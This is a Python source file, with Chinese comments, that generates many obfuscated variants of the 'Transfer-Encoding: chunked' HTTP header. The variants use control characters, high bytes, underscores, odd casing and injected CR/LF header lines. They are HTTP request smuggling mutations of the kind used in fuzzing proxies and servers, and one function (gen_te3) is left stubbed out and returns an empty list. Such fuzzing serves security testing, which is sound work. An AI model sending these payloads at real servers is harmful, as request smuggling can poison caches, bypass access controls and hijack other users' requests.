# 用于生成所有可能的te情况
def gen_te1():
    te1 = []
    for i in range(0x1,0x21):
        # cl1.append(["content-length","%c1"%(i)]) 
        te1.append(["%cTransfer-Encoding"%(i),"chunked"])
        te1.append(["Transfer-Encoding%c"%(i),"chunked"])
        te1.append(["Transfer-Encoding","%cchunked"%(i)])
        te1.append(["Transfer-Encoding","chunked%c"%(i)])

        te1.append(["X: X%cTransfer-Encoding"%(i),"chunked"])
        te1.append(["Transfer-Encoding","chunked%cX: X"%(i)])
        te1.append(["X: X\r%cTransfer-Encoding"%(i),"chunked"])
        te1.append(["X: X%c\nTransfer-Encoding"%(i),"chunked"])
        te1.append(["Transfer-Encoding", "chunked\r%cX: X"%(i)])
        te1.append(["Transfer-Encoding", "chunked%c\nX: X"%(i)])

        te1.append(["%cTransfer-Encoding%c"%(i,i),"chunked"])
        te1.append(["%cTransfer-Encoding"%(i),"%cchunked"%(i)])
        te1.append(["%cTransfer-Encoding"%(i),"chunked%c"%(i)])
        te1.append(["Transfer-Encoding%c"%(i),"%cchunked"%(i)])
        te1.append(["Transfer-Encoding%c"%(i),"chunked%c"%(i)])
        te1.append(["Transfer-Encoding","%cchunked%c"%(i,i)])

        # "-"to"_"
        te1.append(["%cTransfer_Encoding"%(i),"chunked"])
        te1.append(["Transfer_Encoding%c"%(i),"chunked"])
        te1.append(["Transfer_Encoding","%cchunked"%(i)])
        te1.append(["Transfer_Encoding","chunked%c"%(i)])

        te1.append(["X: X%cTransfer_Encoding"%(i),"chunked"])
        te1.append(["Transfer_Encoding","chunked%cX: X"%(i)])
        te1.append(["X: X\r%cTransfer_Encoding"%(i),"chunked"])
        te1.append(["X: X%c\nTransfer_Encoding"%(i),"chunked"])
        te1.append(["Transfer_Encoding", "chunked\r%cX: X"%(i)])
        te1.append(["Transfer_Encoding", "chunked%c\nX: X"%(i)])

        te1.append(["%cTransfer_Encoding%c"%(i,i),"chunked"])
        te1.append(["%cTransfer_Encoding"%(i),"%cchunked"%(i)])
        te1.append(["%cTransfer_Encoding"%(i),"chunked%c"%(i)])
        te1.append(["Transfer_Encoding%c"%(i),"%cchunked"%(i)])
        te1.append(["Transfer_Encoding%c"%(i),"chunked%c"%(i)])
        te1.append(["Transfer_Encoding","%cchunked%c"%(i,i)])
    return te1

def gen_te2():
    te2 = []
    for i in range(0x7F,0x100):
        te2.append(["%cTransfer-Encoding"%(i),"chunked"])
        te2.append(["Transfer-Encoding%c"%(i),"chunked"])
        te2.append(["Transfer-Encoding","%cchunked"%(i)])
        te2.append(["Transfer-Encoding","chunked%c"%(i)])

        te2.append(["X: X%cTransfer-Encoding"%(i),"chunked"])
        te2.append(["Transfer-Encoding","chunked%cX: X"%(i)])
        te2.append(["X: X\r%cTransfer-Encoding"%(i),"chunked"])
        te2.append(["X: X%c\nTransfer-Encoding"%(i),"chunked"])
        te2.append(["Transfer-Encoding", "chunked\r%cX: X"%(i)])
        te2.append(["Transfer-Encoding", "chunked%c\nX: X"%(i)])

        te2.append(["%cTransfer-Encoding%c"%(i,i),"chunked"])
        te2.append(["%cTransfer-Encoding"%(i),"%cchunked"%(i)])
        te2.append(["%cTransfer-Encoding"%(i),"chunked%c"%(i)])
        te2.append(["Transfer-Encoding%c"%(i),"%cchunked"%(i)])
        te2.append(["Transfer-Encoding%c"%(i),"chunked%c"%(i)])
        te2.append(["Transfer-Encoding","%cchunked%c"%(i,i)])
        # "-"to"_"

        te2.append(["%cTransfer_Encoding"%(i),"chunked"])
        te2.append(["Transfer_Encoding%c"%(i),"chunked"])
        te2.append(["Transfer_Encoding","%cchunked"%(i)])
        te2.append(["Transfer_Encoding","chunked%c"%(i)])

        te2.append(["X: X%cTransfer_Encoding"%(i),"chunked"])
        te2.append(["Transfer_Encoding","chunked%cX: X"%(i)])
        te2.append(["X: X\r%cTransfer_Encoding"%(i),"chunked"])
        te2.append(["X: X%c\nTransfer_Encoding"%(i),"chunked"])
        te2.append(["Transfer_Encoding", "chunked\r%cX: X"%(i)])
        te2.append(["Transfer_Encoding", "chunked%c\nX: X"%(i)])

        te2.append(["%cTransfer_Encoding%c"%(i,i),"chunked"])
        te2.append(["%cTransfer_Encoding"%(i),"%cchunked"%(i)])
        te2.append(["%cTransfer_Encoding"%(i),"chunked%c"%(i)])
        te2.append(["Transfer_Encoding%c"%(i),"%cchunked"%(i)])
        te2.append(["Transfer_Encoding%c"%(i),"chunked%c"%(i)])
        te2.append(["Transfer_Encoding","%cchunked%c"%(i,i)])
    return te2
def gen_te3():
    for i in [0x1,0x4,0x8,0x9,0xa,0xb,0xc,0xd,0x1F,0x20,0x7f,0xA0,0xFF]:
        te3 = []
        # te3.append(["Transfer-Encoding:%cchunked"%(i)))
       
        # te3.append(["Transfer-Encoding%c: chunked"%(i)))
       
        # te3.append(["%cTransfer-Encoding: chunked"%(i)))
       
        # te3.append(["Transfer-Encoding: chunked%c"%(i)))
        # #这些情况根据:分割有
        # te3.append(["X: X%cTransfer-Encoding: chunked"%(i)))
        # te3.append(["Transfer-Encoding: chunked%cX: X"%(i)))
        # te3.append(["X: X\r%cTransfer-Encoding: chunked"%(i)))
        # te3.append(["X: X%c\nTransfer-Encoding: chunked"%(i)))
        # te3.append(["Transfer-Encoding: chunked\r%cX: X"%(i)))
        # te3.append(["Transfer-Encoding: chunked%c\nX: X"%(i)))
        return te3
       

def gen_te4():
    te4 = [" Transfer-Encoding: chunked", "Transfer-Encoding:\tchunked", "Transfer-Encoding\t:\tchunked","Transfer Encoding: chunked",
       "Transfer_Encoding: chunked", "Transfer Encoding:chunked","Transfer-Encoding : chunked", "Transfer-Encoding:  chunked",
       "Transfer-Encoding:\u000Bchunked", "Transfer-Encoding: chunked, cow","Transfer-Encoding: cow, chunked","Content-Encoding: chunked",
       "Transfer-Encoding:\n chunked","Transfer-Encoding: \"chunked\"","Transfer-Encoding: 'chunked'","Transfer-Encoding: chunk",
       "TrAnSFer-EnCODinG: cHuNkeD", "TRANSFER-ENCODING: CHUNKED", "Transfer-Encoding: chunked\r", "Transfer-Encoding: chunked\t",
       "Transfer\r-Encoding: chunked","Transfer-Encoding: cow chunked bar","Transfer-Encoding:\xFFchunked",
       "Transfer-Encoding: ch\x96nked", "Transf\x82r-Encoding: chunked"]
        #这几个情况也是根据:无法分割的
       # "Transfer-Encoding: cow\r\nTransfer-Encoding: chunked",  "X:X\rTransfer-Encoding: chunked","X:X\nTransfer-Encoding: chunked"]
    return te4

def gen_te5():
    te5 =[]
    for i in range(0x1,0x21):
        te5.append(["%cTransfer-Encoding%c"%(i,i),"chunked"])
        te5.append(["%cTransfer-Encoding"%(i),"%cchunked"%(i)])
        te5.append(["%cTransfer-Encoding"%(i),"chunked%c"%(i)])
        te5.append(["Transfer-Encoding%c"%(i),"%cchunked"%(i)])
        te5.append(["Transfer-Encoding%c"%(i),"chunked%c"%(i)])
        te5.append(["Transfer-Encoding","%cchunked%c"%(i,i)])
    return te5

def gen_te6():
    te6 =[]
    for i in range(0x7F,0x100):
        te6.append(["%cTransfer-Encoding%c"%(i,i),"chunked"])
        te6.append(["%cTransfer-Encoding"%(i),"%cchunked"%(i)])
        te6.append(["%cTransfer-Encoding"%(i),"chunked%c"%(i)])
        te6.append(["Transfer-Encoding%c"%(i),"%cchunked"%(i)])
        te6.append(["Transfer-Encoding%c"%(i),"chunked%c"%(i)])
        te6.append(["Transfer-Encoding","%cchunked%c"%(i,i)])
    return te6